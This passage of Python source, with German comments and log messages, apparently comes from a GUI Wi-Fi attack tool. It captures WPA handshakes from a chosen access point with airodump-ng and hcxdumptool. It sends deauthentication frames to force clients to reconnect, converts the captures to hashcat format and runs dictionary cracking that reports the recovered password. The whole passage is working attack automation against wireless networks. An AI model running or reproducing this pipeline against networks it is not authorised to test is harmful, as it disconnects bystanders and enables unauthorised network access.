                            break
                        time.sleep(0.1)

            self.failed.emit(
                f"Kein Handshake nach {self.max_retries} Versuchen " f"({last_error})"
            )
        except Exception as exc:
            self._logger.exception("HandshakeCaptureThread.run")
            self.failed.emit(f"Interner Fehler: {exc}")

    # ------------------------------------------------------------------
    def _run_single_attempt(self, attempt: int) -> bool:
        """Ein Capture-Versuch mit dem gewählten Modus."""
        cap_prefix = (
            self.output_dir / f"hs_{self.bssid.replace(':', '')}_"
            f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_a{attempt}"
        )

        # PMKID-Modus (hcxdumptool) parallel zu airodump wenn deauth+pmkid
        pmkid_thread: threading.Thread | None = None
        if self.mode in ("pmkid", "deauth+pmkid"):
            pmkid_thread = threading.Thread(
                target=_thread_wrap(self._run_pmkid, "HandshakePMKID"),
                args=(cap_prefix,),
                daemon=True,
                name="HandshakePMKID",
            )
            pmkid_thread.start()

        # Airodump-ng (alle Modi außer reinem pmkid)
        airodump_session: str | None = None
        if self.mode != "pmkid":
            airodump_session = f"hs_airodump_{int(time.time())}"
            self._log(f"Starte airodump-ng (session={airodump_session})")
            try:
                self.attack_ctrl._run_tool_with_session(
                    airodump_session,
                    "airodump-ng",
                    [
                        "-c",
                        str(self.channel),
                        "--bssid",
                        self.bssid,
                        "-w",
                        str(cap_prefix),
                        self.iface,
                    ],
                )
            except Exception as exc:
                self._log(f"airodump-ng-Start: {exc}", "ERR")
                airodump_session = None

        # Deauth (nur bei deauth-Modi)
        if self.mode in ("deauth", "deauth+pmkid"):
            time.sleep(2)
            if self._abort.is_set():
                return False
            self._log(f"Sende Deauth ({self.deauth_count} Frames)")
            try:
                self.attack_ctrl.run_deauth(
                    self.iface,
                    self.bssid,
                    client=self.target_client,
                    count=self.deauth_count,
                )
            except Exception as exc:
                self._log(f"Deauth: {exc}", "WARN")

        # Warten auf Handshake
        start = time.time()
        last_progress = 5
        while time.time() - start < self.timeout:
            if self._abort.is_set():
                break

            # Progress
            elapsed = time.time() - start
            pct = min(95, 5 + int(90 * elapsed / self.timeout))
            if pct > last_progress:
                self._emit_progress(pct)
                last_progress = pct

            # Capture-Datei prüfen
            self._check_capture_files(cap_prefix)

            # EAPOL-Peek (aus tshark/tcpdump wenn möglich)
            self._check_eapol_progress(cap_prefix)

            # Signal-Update (falls verfügbar)
            self._maybe_emit_signal()

            if self._eapol_seen and len(self._eapol_seen) >= 4:
                self._log("Handshake komplett (4/4 EAPOL)", "OK")
                break

            time.sleep(0.5)

        # Aufräumen
        if airodump_session:
            try:
                self.attack_ctrl.tool_manager.stop_tool(airodump_session)
            except (AttributeError, RuntimeError, OSError) as exc:
                self._logger.debug("stop_tool: %s", exc)

        # Letzte Prüfung
        self._check_capture_files(cap_prefix)
        if self._capture_file and self._capture_file.exists():
            self._convert_to_22000(self._capture_file)
            return True
        return False

    # ------------------------------------------------------------------
    def _check_capture_files(self, cap_prefix: Path) -> None:
        """Sucht nach .cap/.pcapng-Dateien mit Handshake."""
        try:
            for pat in ("*.cap", "*.pcap", "*.pcapng"):
                for f in cap_prefix.parent.glob(cap_prefix.name + pat):
                    try:
                        if f.stat().st_size > 1000:
                            self._capture_file = f
                            return
                    except OSError:
                        continue
        except (OSError, ValueError) as exc:
            self._logger.debug("check_capture: %s", exc)

    def _check_eapol_progress(self, cap_prefix: Path) -> None:
        """Zählt EAPOL-Frames im Capture (wenn tshark verfügbar)."""
        # Ohne tshark: Heuristik über Dateigröße
        if not self._capture_file:
            return
        try:
            size = self._capture_file.stat().st_size
            # Grobe Schätzung: jeder EAPOL-4-Way ~ 800 Byte
            eapol_est = min(4, max(1, size // 800))
            if eapol_est > len(self._eapol_seen):
                new_count = eapol_est - len(self._eapol_seen)
                for i in range(len(self._eapol_seen), eapol_est):
                    self._eapol_seen.add(i + 1)
                self._log(
                    f"EAPOL-Frames erkannt: {eapol_est}/4 " f"(+{new_count})",
                    "OK" if eapol_est >= 4 else "INFO",
                )
            self.eapol_update.emit(len(self._eapol_seen), 4)
        except (OSError, ValueError):
            pass

    def _maybe_emit_signal(self) -> None:
        """Emitet aktuelle Signalstaerke (aus airodump-Log oder iw)."""
        try:
            rc, out, _ = (
                self.attack_ctrl.controller.tool_manager._run(
                    ["iw", "dev", self.iface, "station", "dump"],
                    tag="sig",
                )
                if hasattr(self.attack_ctrl.controller.tool_manager, "_run")
                else (-1, "", "")
            )
            if rc == 0 and out:
                m = re.search(r"signal:\s*(-?\d+)", out)
                if m:
                    self.signal_update.emit(int(m.group(1)))
        except (AttributeError, OSError, ValueError):
            pass

    def _run_pmkid(self, cap_prefix: Path) -> None:
        """PMKID-Capture mit hcxdumptool."""
        try:
            if shutil.which("hcxdumptool") is None:
                self._log("hcxdumptool nicht gefunden — PMKID übersprungen", "WARN")
                return
            pmkid_out = cap_prefix.with_suffix(".pcapng")
            self._log(f"PMKID-Capture → {pmkid_out.name}")
            # v37-R34 P15c: hcxdumptool 7.x - --rds statt --enable_status,
            # -c ohne 'a'-Suffix (das war 6.x). Modus 7.x aktiviert den
            # Monitor-Modus selbst.
            cmd = [
                "hcxdumptool",
                "-i",
                self.iface,
                "-w",
                str(pmkid_out),
                "-c",
                str(self.channel),
                "--rds=1",
            ]
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            start = time.time()
            while time.time() - start < self.timeout:
                if self._abort.is_set():
                    break
                if proc.poll() is not None:
                    break
                time.sleep(0.5)
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except (subprocess.TimeoutExpired, OSError):
                try:
                    proc.kill()
                except OSError:
                    pass
            if pmkid_out.exists() and pmkid_out.stat().st_size > 0:
                self._log(f"PMKID-Capture: {pmkid_out.name}", "OK")
                # Wenn noch kein Handshake, PMKID als Capture nehmen
                if not self._capture_file:
                    self._capture_file = pmkid_out
        except (FileNotFoundError, OSError, subprocess.SubprocessError) as exc:
            self._log(f"PMKID-Fehler: {exc}", "WARN")

    def _convert_to_22000(self, cap_file: Path) -> None:
        """Konvertiert Capture zu .22000 (hashcat) wenn möglich."""
        try:
            pipeline = CrackPipeline()
            converted, msg = pipeline.convert_pcap(cap_file, "22000")
            if converted:
                self._log(
                    f"Konvertiert: {converted.name}",
                    "OK",
                )
        except Exception as exc:
            self._logger.debug("Konvertierung: %s", exc)


class HandshakeCrackThread(QThread):
    """Asynchroner Cracking-Thread für .22000-Dateien.

    Signals:
        log_line(str, str): (message, level)
        finished_ok(str): Passwort
        failed(str): Fehlermeldung
    """

    log_line = pyqtSignal(str, str)
    finished_ok = pyqtSignal(str)
    failed = pyqtSignal(str)

    def __init__(
        self,
        hash_file: str | Path,
        wordlist: str | Path,
        hash_mode: str = "22000",
        rules: str = "",
        incremental: bool = False,
        use_potfile: bool = False,
        timeout: int = 3600,
        parent: QObject | None = None,
    ) -> None:
        super().__init__(parent)
        self.hash_file = Path(hash_file)
        self.wordlist = Path(wordlist)
        self.hash_mode = str(hash_mode)
        self.rules = rules
        self.incremental = incremental
        self.use_potfile = use_potfile
        self.timeout = timeout
        self._logger = logging.getLogger("wlan_ultimate.HandshakeCrackThread")
        self._proc: subprocess.Popen | None = None
        self._abort = threading.Event()

    def abort(self) -> None:
        """Bricht das Cracking ab."""
        self._abort.set()
        try:
            if self._proc is not None and self._proc.poll() is None:
                self._proc.terminate()
        except (OSError, RuntimeError):
            pass

    def _log(self, msg: str, level: str = "INFO") -> None:
        self.log_line.emit(str(msg)[:300], level)
        self._logger.info(msg)

    def run(self) -> None:
        try:
            if not self.hash_file.exists():
                self.failed.emit(f"Hash-Datei fehlt: {self.hash_file}")
                return
            if not self.wordlist.exists():
                self.failed.emit(f"Wortliste fehlt: {self.wordlist}")
                return
            if shutil.which("hashcat") is None:
                self.failed.emit("hashcat nicht installiert")
                return

            out_file = Path("/tmp/hashcat_handshake_out.txt")
            try:
                if out_file.exists():
                    out_file.unlink()
            except OSError:
                pass

            cmd = [
                "hashcat",
                "-m",
                self.hash_mode,
                "-a",
                "0",
                "--force",
                "--quiet",
                "--outfile-format=2",
                "-o",
                str(out_file),
            ]
            if not self.use_potfile:
                cmd.append("--potfile-disable")
            if self.rules:
                cmd.extend(["-r", self.rules])
            if self.incremental:
                cmd.append("--increment")
            cmd.extend([str(self.hash_file), str(self.wordlist)])

            self._log(f"Starte: {' '.join(cmd[:8])} …", "OK")
            self._log(f"Wortliste: {self.wordlist.name}")

            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )

            start = time.time()
            last_emit = 0.0
            if self._proc.stdout is not None:
                for line in self._proc.stdout:
                    if self._abort.is_set():
                        break
                    now = time.time()
                    if now - start > self.timeout:
                        self._log("Timeout erreicht — stoppe", "WARN")
                        self.abort()
                        break
                    # hashcat-Status-Zeilen filtern
                    s = line.strip()
                    if s and ("Status" in s or "Progress" in s or "Recovered" in s):
                        if now - last_emit > 2.0:
                            self._log(s[:200])
                            last_emit = now

            try:
                self._proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._proc.kill()

            # Passwort prüfen
            if out_file.exists():
                try:
                    text = out_file.read_text(encoding="utf-8").strip()
                    if text:
                        pwd = text.split(":")[-1].strip()
                        if pwd:
                            self._log(f"PASSWORT GEFUNDEN: {pwd}", "OK")
                            self.finished_ok.emit(pwd)
                            return
                except OSError as exc:
                    self._logger.debug("outfile: %s", exc)

            if self._abort.is_set():
                self.failed.emit("Abgebrochen")
            else:
                self.failed.emit("Kein Passwort gefunden (Wortliste zu klein?)")
        except Exception as exc:
            self._logger.exception("HandshakeCrackThread.run")
            self.failed.emit(f"Interner Fehler: {exc}")


